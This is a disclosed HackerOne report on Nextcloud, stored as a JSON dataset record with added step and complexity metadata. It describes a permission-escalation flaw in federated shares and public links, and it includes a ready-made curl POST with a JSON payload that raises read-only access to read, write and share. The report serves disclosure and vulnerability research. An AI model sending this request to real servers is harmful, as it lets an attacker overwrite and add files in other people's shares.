{
  "reported_to": "Nextcloud",
  "reported_by": "rtod ",
  "title": "Attacker can obtain write access to any federated share/public link",
  "content": "\nHi mates,\nI stumbled across this with public links. But the same holds true for any federated share. I will try to describe the link scenario.\nAt first I thought there were more steps (and resharing was involved). But it really is very simples:\nAn attacker obtains a public link (again plenty of those around). For the sake of the attack it is a read only public link\nThe attacker uses the 'add to my nextcloud' functionality to have a federated share created to their own instance\nThe attacker accepts this share\nNow the attacker checks their database and finds the entry in the oc_share_external table.\nWe are looking for really only the remote id. And the token.\nFor the sake of this example the remote id = 2 and the token = nOxdNJkb1xbI1VX\nNow we craft our request\nCode 275 Bytes\n1curl -v -X POST http://localhost/index.php/ocm/notifications -d '{\"notificationType\":\"RESHARE_CHANGE_PERMISSION\",\"resourceType\":\"file\",\"providerId\":2,\"notification\":{\"sharedSecret\":\"nOxdNJkb1xbI1VX\",\"permission\":[\"read\",\"write\",\"share\"]}}' -H 'Content-type: application/json'\nTo break this down.\nWe send an (anonymous) POST request to the victims server to be precise to index.php/ocm/notifications\nAnd we pass it the following json\nCode 245 Bytes\n1{\n2   \"notificationType\":\"RESHARE_CHANGE_PERMISSION\",\n3   \"resourceType\":\"file\",\n4   \"providerId\":2,\n5   \"notification\":{\n6      \"sharedSecret\":\"nOxdNJkb1xbI1VX\",\n7      \"permission\":[\n8         \"read\",\n9         \"write\",\n10         \"share\"\n11      ]\n12   }\n13}\nThe attacker now enjoys their federated share with READ+WRITE+UPDATE+CREATE+SHARE access. (I think it is probably even a bug that there is no way to grant DELETE).\nSince we create a federated share at step 1. This also holds true for any created federated share.\nImpact\nIn short if an attacker has a public link. Or a federated share with them they can elevate their permissions very easily.\nThis allows them to overwrite files. Add new files. And so on. In short the integrity of all files in public links and federated shares should be considered compromised.\nPardon my directness. But you really should take a serious look at your federation code. As it seems to miss checks all over the place. Maybe recommending everybody to disable it for now is the best course of action.\n\n",
  "severity": [
    8.1,
    null
  ],
  "bounty": 4000,
  "weaknesses": [
    "Improper Authentication - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1623346860,
  "report_url": "https://hackerone.com/reports/1170024",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Obtain a read-only public link or federated share from the target Nextcloud instance."
    ],
    [
      2,
      "Use the 'add to my nextcloud' functionality to create a federated share to the attacker's own instance."
    ],
    [
      3,
      "Accept the share on the attacker's instance and retrieve the remote ID and token from the oc_share_external table."
    ],
    [
      4,
      "Craft a POST request to the victim's server with the notificationType 'RESHARE_CHANGE_PERMISSION', including the sharedSecret and elevated permissions."
    ],
    [
      5,
      "Send the crafted request to the victim's server to elevate permissions to read+write+share."
    ]
  ],
  "vuln_description": "An attacker can elevate permissions on a federated share or public link from read-only to read+write+share by crafting a specific POST request to the victim's Nextcloud server. This allows the attacker to overwrite files, add new files, and share the content further, compromising the integrity of the shared files.",
  "reason": "The vulnerability involves understanding the federated sharing mechanism, database structure, and crafting a specific HTTP request. While the steps are straightforward once understood, the interaction between the federated share creation and permission modification via the OCM endpoint is non-obvious.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "idor_detectable": true,
  "authnz_byppass_detectable": true,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reasoning": "The vulnerability involves an attacker sending an unauthorized POST request to modify share permissions without proper authentication or authorization checks. The described methodology includes testing actions with unauthenticated sessions (step 3d), which could detect this flaw if the endpoint `/ocm/notifications` is tested for AuthN/AuthZ bypasses. The attack does not require session swapping or resource ID substitution but exploits missing server-side checks for anonymous requests, aligning with the AuthZ bypass detection logic.",
    "is_simple_authnz": true
  }
}